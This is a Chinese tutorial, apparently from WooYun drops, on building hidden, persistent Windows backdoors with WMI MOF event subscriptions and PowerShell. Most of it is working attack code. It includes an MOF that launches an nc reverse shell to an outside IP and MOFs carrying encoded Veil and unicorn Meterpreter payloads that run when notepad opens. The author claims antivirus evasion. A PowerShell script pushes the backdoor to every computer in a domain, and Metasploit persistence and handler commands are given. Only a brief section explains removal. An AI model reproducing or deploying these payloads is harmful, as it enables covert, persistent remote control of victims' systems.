# Powershell之MOF后门

0x00 MOF
========

* * *

Managed Object Format (MOF)是WMI数据库中类和类实例的原始保存形式。具体介绍可以阅读[《WMI 的攻击，防御与取证分析技术之防御篇》](http://drops.wooyun.org/tips/10346)，Windows 管理规范 (WMI) 提供了以下三种方法编译到WMI存储库的托管对象格式 (MOF) 文件：

*   方法 1： 使用Mofcomp.exe。
*   方法 2： 使用 IMofCompiler 接口和`$ CompileFile`方法。
*   方法 3： 拖放到`%SystemRoot%\System32\Wbem\MOF`文件夹的 MOF 文件。

> 第三种方法仅为向后兼容性与早期版本（win2003）的 WMI 提供。

一个简单的MOF反弹shell示例：

```
#pragma namespace ("\\\\.\\root\\subscription")

instance of __EventFilter as $FILTER
{
    Name = "CLASS_FIRST_TEST";
    EventNamespace = "root\\cimv2";
 Query = "SELECT * FROM __InstanceCreationEvent "
  "WHERE TargetInstance ISA \"Win32_NTLogEvent\" AND "
  "TargetInstance.LogFile=\"Application\"";
    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    Name = "CLASS_FIRST_TEST";
    ScriptingEngine = "VBScript";

    ScriptText =
      "Set objShell = CreateObject(\"WScript.Shell\")\n"
   "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 192.168.38.1 1337 -e C:\\Windows\\system32\\cmd.exe\"\n";
};

instance of __FilterToConsumerBinding
{
    Consumer = $CONSUMER ;
    Filter = $FILTER ;
};

```

0x01 MOF and Powershell
=======================

* * *

如果获取了管理员权限，使用MOF可以做一个永久的隐藏后门。对于很多后门来说，都需要一个触发，在这里，可以使用[WMI Query Language(WQL)](http://www.jb51.net/article/52489.htm)来查询事件，以便确定什么时候触发我们的后门。（更多详细的解释可在查看[戳我](http://www.codeproject.com/Articles/28226/Creating-WMI-Permanent-Event-Subscriptions-Using-M)，[戳我](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html))。

比如，我们想做一个后门通过打开notepad来触发，可以使用以下查询：

```
"SELECT * FROM __InstanceCreationEvent Within 5 " 
  "Where TargetInstance Isa \"Win32_Process\" "
  "And Targetinstance.Name = \"notepad.exe\" ";

```

如果想通过关闭Powershell来触发，可以使用以下查询：

```
"SELECT * FROM __InstanceDeletionEvent Within 5 " 
  "Where TargetInstance Isa \"Win32_Process\" "
  "And Targetinstance.Name = \"powershell.exe\" ";

```

如果想通过每小时在30分钟的时候触发，可使用以下查询：

```
"Select * From __InstanceModificationEvent "
  "Where TargetInstance Isa \"Win32_LocalTime\" "
  "And TargetInstance.Minute = 30 "

```

当我们确定了我们的触发方式以后，我们就可以把我们的查询写成一个MOF过滤器：

```
instance of __EventFilter as $Filt
{
    Name = "EventFilter";
    EventNamespace = "Root\\Cimv2";
    Query = <插入查询> 
    QueryLanguage = "WQL";
};

```

比如我们使用打开Notepad作为触发条件，那么可以这样写：

```
instance of __EventFilter as $Filt
{
    Name = "EventFilter";
    EventNamespace = "Root\\Cimv2";
    Query ="SELECT * FROM __InstanceCreationEvent Within 5" 
           "Where TargetInstance Isa \"Win32_Process\" "
           "And Targetinstance.Name = \"notepad.exe\" ";
    QueryLanguage = "WQL";
};

```

下面我们就需要事件消费者的响应了，在这里我们可以使用不同的[EventConsumer](https://msdn.microsoft.com/en-us/library/aa392395(v=vs.85).aspx?tduid=(c301fb77b3a8b885de2b9a1f7456c5ac)(256380)(2459594)(TnL5HPStwNw-ektmYir908cxwICjxz7cAg)())类，通过使用CommandLineEventConsumer，我们可以使用Veil输出的payload，同时也可以使用ActiveScriptEventConsumer来嵌入或者调用VBS脚本。下面是一个使用CommandLineEventConsumer的示例：

```
"cmd /C [data here]";

```

下面使用Veil来生成Powershell payload:

![Alt text](http://drops.javaweb.org/uploads/images/c43a6f31f62044d4583c7e5095a813915d91868b.jpg)

选择x86里面进行测试，payload如下：

```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"

```

接下来，我们把上面的payload放到下面的模板中：

```
instance of CommandLineEventConsumer as $Cons
{
    Name = "Powershell Helper";
    RunInteractively=false;
    CommandLineTemplate="cmd /C powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();";
};

```

> 这里要注意一点就是如果payload里面存在需要转义的`"`以及`\`这里可以使用双引号将qi其引用并用\进行转义。

最后我们所写的MOF文件是这样的：

```
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
instance of CommandLineEventConsumer as $Cons
{
    Name = "Powershell Helper";
    RunInteractively=false;
    CommandLineTemplate="cmd /C powershell.exe -NoP -NonI -W Hidden"
    " -Exec Bypass -Command \"Invoke-Expression "
    "$(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String"
    "(\\\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5"
    "UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/"
    "Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13"
    "URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/"
    "JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/"
    "ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/"
    "RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\\\")))), "
    "[IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"";
};

instance of __EventFilter as $Filt
{
    Name = "EventFilter";
    EventNamespace = "Root\\Cimv2";
    Query ="SELECT * FROM __InstanceCreationEvent Within 5" 
           "Where TargetInstance Isa \"Win32_Process\" "
           "And Targetinstance.Name = \"notepad.exe\" ";
    QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding {
     Filter = $Filt;
     Consumer = $Cons;
};

```

如果觉得麻烦的话，可以使用这个工具[unicorn](https://github.com/trustedsec/unicorn)来生成没有特殊字符的payload，使用方式很简单:

```
☁  unicorn [master] python unicorn.py windows/meterpreter/reverse_tcp 192.168.74.141 8889

```

将`powershell_attack.txt`的内容复制进来，然后`msfconsole -r unicorn.rc`则可开启监听,修改后的MOF文件如下：

```
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
instance of CommandLineEventConsumer as $Cons
{
    Name = "Powershell Helper";
    RunInteractively=false;
    CommandLineTemplate="cmd /C powershell -window hidden -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAZAA5ACwAMAB4AGMANAAsADAAeABiAGEALAAwAHgAYQBlACwAMAB4AGUAZAAsADAAeABmADMALAAwAHgANgA0ACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1AGYALAAwAHgAMgBiACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA1ADcALAAwAHgAMQA4ACwAMAB4ADgAMwAsADAAeABjADcALAAwAHgAMAA0ACwAMAB4ADAAMwAsADAAeAA1ADcALAAwAHgAYgBhACwAMAB4ADAAZgAsADAAeAAwADYALAAwAHgAOQA4ACwAMAB4ADIAYQAsADAAeAA0AGQALAAwAHgAZQA5ACwAMAB4ADYAMQAsADAAeABhAGEALAAwAHgAMwAyACwAMAB4ADYAMwAsADAAeAA4ADQALAAwAHgAOQBiACwAMAB4ADcAMgAsADAAeAAxADcALAAwAHgAYwBjACwAMAB4ADgAYgAsADAAeAA0ADIALAAwAHgANQAzACwAMAB4ADgAMAAsADAAeAAyADcALAAwAHgAMgA4ACwAMAB4ADMAMQAsADAAeAAzADEALAAwAHgAYgBjACwAMAB4ADUAYwAsADAAeAA5AGUALAAwAHgAMwA2ACwAMAB4ADcANQAsADAAeABlAGEALAAwAHgAZgA4ACwAMAB4ADcAOQAsADAAeAA4ADYALAAwAHgANAA3ACwAMAB4ADMAOAAsADAAeAAxAGIALAAwAHgAMAA0ACwAMAB4ADkAYQAsADAAeAA2AGQALAAwAHgAZgBiACwAMAB4ADMANQAsADAAeAA1ADUALAAwAHgANgAwACwAMAB4AGYAYQAsADAAeAA3ADIALAAwAHgAOAA4ACwAMAB4ADgAOQAsADAAeABhAGUALAAwAHgAMgBiACwAMAB4AGMANgAsADAAeAAzAGMALAAwAHgANQBmACwAMAB4ADUAOAAsADAAeAA5ADIALAAwAHgAZgBjACwAMAB4AGQANAAsADAAeAAxADIALAAwAHgAMwAyACwAMAB4ADgANQAsADAAeAAwADkALAAwAHgAZQAyACwAMAB4ADMANQAsADAAeABhADQALAAwAHgAOQBmACwAMAB4ADcAOQAsADAAeAA2AGMALAAwAHgANgA2ACwAMAB4ADIAMQAsADAAeABhAGUALAAwAHgAMAA0ACwAMAB4ADIAZgAsADAAeAAzADkALAAwAHgAYgAzACwAMAB4ADIAMQAsADAAeABmADkALAAwAHgAYgAyACwAMAB4ADAANwAsADAAeABkAGQALAAwAHgAZgA4ACwAMAB4ADEAMgAsADAAeAA1ADYALAAwAHgAMQBlACwAMAB4ADUANgAsADAAeAA1AGIALAAwAHgANQA3ACwAMAB4AGUAZAAsADAAeABhADYALAAwAHgAOQBiACwAMAB4ADUAZgAsADAAeAAwAGUALAAwAHgAZABkACwAMAB4AGQANQAsADAAeAA5AGMALAAwAHgAYgAzACwAMAB4AGUANgAsADAAeAAyADEALAAwAHgAZABmACwAMAB4ADYAZgAsADAAeAA2ADIALAAwAHgAYgAyACwAMAB4ADQANwAsADAAeABmAGIALAAwAHgAZAA0ACwAMAB4ADEAZQAsADAAeAA3ADYALAAwAHgAMgA4ACwAMAB4ADgAMgAsADAAeABkADUALAAwAHgANwA0ACwAMAB4ADgANQAsADAAeABjADAALAAwAHgAYgAyACwAMAB4ADkAOAAsADAAeAAxADgALAAwAHgAMAA0ACwAMAB4AGMAOQAsADAAeABhADQALAAwAHgAOQAxACwAMAB4AGEAYgAsADAAeAAxAGUALAAwAHgAMgBkACwAMAB4AGUAMQAsADAAeAA4AGYALAAwAHgAYgBhACwAMAB4ADcANgAsADAAeABiADEALAAwAHgAYQBlACwAMAB4ADkAYgAsADAAeABkADIALAAwAHgAMQA0ACwAMAB4AGMAZQAsADAAeABmAGMALAAwAHgAYgBkACwAMAB4AGMAOQAsADAAeAA2AGEALAAwAHgANwA2ACwAMAB4ADUAMwAsADAAeAAxAGQALAAwAHgAMAA3ACwAMAB4AGQANQAsADAAeAAzAGIALAAwAHgAZAAyACwAMAB4ADIAYQAsADAAeABlADYALAAwAHgAYgBiACwAMAB4ADcAYwAsADAAeAAzAGMALAAwAHgAOQA1ACwAMAB4ADgAOQAsADAAeAAyADMALAAwAHgAOQA2ACwAMAB4ADMAMQAsADAAeABhADEALAAwAHgAYQBjACwAMAB4ADMAMAAsADAAeABjADUALAAwAHgAYwA2ACwAMAB4ADgANgAsADAAeAA4ADUALAAwAHgANQA5ACwAMAB4ADMAOQAsADAAeAAyADkALAAwAHgAZgA2ACwAMAB4ADcAMAAsADAAeABmAGQALAAwAHgANwBkACwAMAB4AGEANgAsADAAeABlAGEALAAwAHgAZAA0ACwAMAB4AGYAZAAsADAAeAAyAGQALAAwAHgAZQBiACwAMAB4AGQAOQAsADAAeAAyAGIALAAwAHgAZABiACwAMAB4AGUAZQAsADAAeAA0AGQALAAwAHgAMQA0ACwAMAB4AGIANAAsADAAeABiAGIALAAwAHgAMAAwACwAMAB4AGYAYwAsADAAeABjADcALAAwAHgAMwBiACwAMAB4ADMAOAAsADAAeAA0ADQALAAwAHgANABlACwAMAB4AGQAZAAsADAAeAA2AGMALAAwAHgAZQA2ACwAMAB4ADAAMQAsADAAeAA3ADIALAAwAHgAYwBjACwAMAB4ADUANgAsADAAeABlADIALAAwAHgAMgAyACwAMAB4AGEANAAsADAAeABiAGMALAAwAHgAZQBkACwAMAB4ADEAZAAsADAAeABkADQALAAwAHgAYgBlACwAMAB4ADIANwAsADAAeAAzADYALAAwAHgANwBlACwAMAB4ADUAMQAsADAAeAA5AGUALAAwAHgANgBlACwAMAB4ADEANgAsADAAeABjADgALAAwAHgAYgBiACwAMAB4AGUANQAsADAAeAA4ADcALAAwAHgAMQA1ACwAMAB4ADEANgAsADAAeAA4ADAALAAwAHgAOAA3ACwAMAB4ADkAZQAsADAAeAA5ADUALAAwAHgANwA0ACwAMAB4ADQAOQAsADAAeAA1ADcALAAwAHgAZAAzACwAMAB4ADYANgAsADAAeAAzAGQALAAwAHgAOQA3ACwAMAB4AGEAZQAsADAAeABkADUALAAwAHgAZQBiACwAMAB4AGEAOAAsADAAeAAwADQALAAwAHgANwAzACwAMAB4ADEAMwAsADAAeAAzAGQALAAwAHgAYQAzACwAMAB4AGQAMgAsADAAeAA0ADQALAAwAHgAYQA5ACwAMAB4AGEAOQAsADAAeAAwADMALAAwAHgAYQAyACwAMAB4ADcANgAsADAAeAA1ADEALAAwAHgANgA2ACwAMAB4AGIAOQAsADAAeABiAGYALAAwAHgAYwA3ACwAMAB4AGMAOQAsADAAeABkADUALAAwAHgAYgBmACwAMAB4ADAANwAsADAAeABjAGEALAAwAHgAMgA1ACwAMAB4ADkANgAsADAAeAA0AGQALAAwAHgAYwBhACwAMAB4ADQAZAAsADAAeAA0AGUALAAwAHgAMwA2ACwAMAB4ADkAOQAsADAAeAA2ADgALAAwAHgAOQAxACwAMAB4AGUAMwAsADAAeAA4AGQALAAwAHgAMgAxACwAMAB4ADAANAAsADAAeAAwAGMALAAwAHgAZQA0ACwAMAB4ADkANgAsADAAeAA4AGYALAAwAHgANgA0ACwAMAB4ADAAYQAsADAAeABjADEALAAwAHgAZgA4ACwAMAB4ADIAYQAsADAAeABmADUALAAwAHgAMgA0ACwAMAB4AGYAOQAsADAAeAAxADcALAAwAHgAMgAwACwAMAB4ADAAMAAsADAAeAA4AGYALAAwAHgANwA5ACwAMAB4AGYAMAA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAeAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAJAAyACAAPQAgACIALQBlAG4AYwAgACIAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACAAJABlACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A";
};

instance of __EventFilter as $Filt
{
    Name = "EventFilter";
    EventNamespace = "Root\\Cimv2";
    Query ="SELECT * FROM __InstanceCreationEvent Within 5" 
           "Where TargetInstance Isa \"Win32_Process\" "
           "And Targetinstance.Name = \"notepad.exe\" ";
    QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding {
     Filter = $Filt;
     Consumer = $Cons;
};

```

将以上内容保存为test.mof，如果拥有管理员权限，可以将test.mof放到`%SYSTEMROOT%/wbem/MOF`目录（xp以下操作系统），系统会自动编译执行此脚本，如果在XP 或者更高版本的操作系统上可以执行如下命令：

```
C:\>mofcomp.exe c:\test.mof

```

执行以后，当打开记事本的时候，则可生成meterpreter会话：

![Alt text](http://drops.javaweb.org/uploads/images/7523972783de3ff7172462d7d46f440b0a159215.jpg)

同时，这个mof文件是免杀的：

![Alt text](http://drops.javaweb.org/uploads/images/86dd010fa8bd64a75640db2e90f1d6f4b77c43e4.jpg)

当然除了这个我们还可以做其他事情，比如关闭某个程序，当其启动时就关闭，MOF文件如下：

```
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
instance of CommandLineEventConsumer as $Cons
{
    Name = "Powershell Helper 2";
    RunInteractively=false;
    CommandLineTemplate="cmd /C powershell.exe Stop-Process -processname notepad -Force";
};
instance of __EventFilter as $Filt
{
    Name = "EventFilter 2";
    EventNamespace = "Root\\Cimv2";
    Query ="SELECT * FROM __InstanceCreationEvent Within 3"
            "Where TargetInstance Isa \"Win32_Process\" "
            "And Targetinstance.Name = \"notepad.exe\" ";
    QueryLanguage = "WQL";
};
instance of __FilterToConsumerBinding
{ 
     Filter = $Filt;
     Consumer = $Cons;
};

```

如果我们想要远程执行，可使用如下命令：

```
c:\>mofcomp -N \\[machinename]\root\subscription test.mof

```

如果我们在域内，还可以用下面的Powershell脚本批量远程执行：

```
function getNetHosts 
{
$final = @()
＃获取域计算机
$strCategory = "computer"
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
$objSearcher.SearchRoot = $objDomain
$objSearcher.Filter = ("(objectCategory=$strCategory)")
$colProplist = "name", "cn"
foreach ($i in $colPropList){$objSearcher.PropertiesToLoad.Add($i)}
$colResults = $objSearcher.FindAll()
foreach ($objResult in $colResults) 
{
     $objComputer = $objResult.Properties
         $bleh = $objComputer.name
         $final += $bleh
}
return $final
}
$nethosts= getNetHosts
foreach ($nethost in $nethosts)
{
     write-host "Exec on " + $nethost  
     $str = "\\"+$nethost+"\root\subscription"
     $m = mofcomp -N $str test.mof
}

```

使用方式为：

```
c:\> powershell -ExecutionPolicy Bypass .\test.ps1 # mof文件在同一个文件夹下面

```

![Alt text](http://drops.javaweb.org/uploads/images/29f1595e4fefec616517864df480f8a0e20168d5.jpg)

0x02 Meterpreter Post Module
============================

* * *

这里有一个msf的模块，可以实现此后门安装，地址：[metasploit-modules](https://github.com/khr0x40sh/metasploit-modules)，下载以后将其移动到`post/windows/`文件夹则可使用：

```
☁  persistence [master] mv mof_ps_persist.rb $msf_path/modules/post/windows/

```

在获取meterpreter会话以后，安装此后门：

```
msf exploit(web_delivery) > use post/windows/mof_ps_persist 
msf post(mof_ps_persist) > set LHOST 192.168.101.1 
LHOST => 192.168.101.1
msf post(mof_ps_persist) > set lport 8887
lport => 8887
msf post(mof_ps_persist) > set session 4
session => 4
msf post(mof_ps_persist) > run

```

> 默认payload为`windows/meterpreter/reverse_tcp`，执行时间间隔为60秒，如果想通过触发方式启动，可以自行修改ruby脚本。

![Alt text](http://drops.javaweb.org/uploads/images/22ca7a08eefe85178e5d2867f5c427ca9a0ca580.jpg)

开启监听：

```
msf post(mof_ps_persist) > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.101.1 
lhost => 192.168.101.1
msf exploit(handler) > set lport 8887
lport => 8887
msf exploit(handler) > exploit -j

```

![Alt text](http://drops.javaweb.org/uploads/images/8810087ff3e9e25f175124b7adf67204aea5c566.jpg)

> 如果看到错误80041003，说明权限不够，可以试试试用bypassuac,具体怎么bypass，请[戳我](http://evi1cg.me/archives/Powershell_Bypass_UAC.html)。

当会话中断以后，由于mof自动执行，所以可以重新获取meterpreter会话。当对方电脑重启以后，仍可以获取会话。

如果想要清除后门，可以resource 生成的rc文件。

![Alt text](http://drops.javaweb.org/uploads/images/3d0aa6631b1d7acc2254d2dd6cb2952e1c2373d0.jpg)

0x03 停止MOF
==========

* * *

要停止mof，可进行如下操作：

*   第一`net stop winmgmt`停止服务，
*   第二 删除文件夹：`C:\WINDOWS\system32\wbem\Repository\`
*   第三`net start winmgmt`启动服务

0x04 小结
=======

* * *

本篇文章主要介绍了一些结合MOF与powershell来进行制作后门的方式方法，对于MOF大家可能接触最多的就是在MYSQL提权时使用MOF来提权，其实玩儿法还很多，大家可以继续来研究研究，希望此文对你有帮助。

0x05 参考
=======

* * *

*   [http://drops.wooyun.org/tips/10346](http://drops.wooyun.org/tips/10346)
*   [http://drops.wooyun.org/tips/9973](http://drops.wooyun.org/tips/9973)
*   [http://drops.wooyun.org/tips/8290](http://drops.wooyun.org/tips/8290)
*   [http://www.codeproject.com/Articles/27914/WMI-MOF-Basics](http://www.codeproject.com/Articles/27914/WMI-MOF-Basics)
*   [http://www.codeproject.com/Articles/28226/Creating-WMI-Permanent-Event-Subscriptions-Using-M](http://www.codeproject.com/Articles/28226/Creating-WMI-Permanent-Event-Subscriptions-Using-M)
*   [http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)
*   [http://www.cnblogs.com/2018/archive/2010/09/25/1834879.html](http://www.cnblogs.com/2018/archive/2010/09/25/1834879.html)
*   [http://www.jb51.net/article/52489.htm](http://www.jb51.net/article/52489.htm)

**本文由evi1cg原创并首发于乌云drops，转载请注明**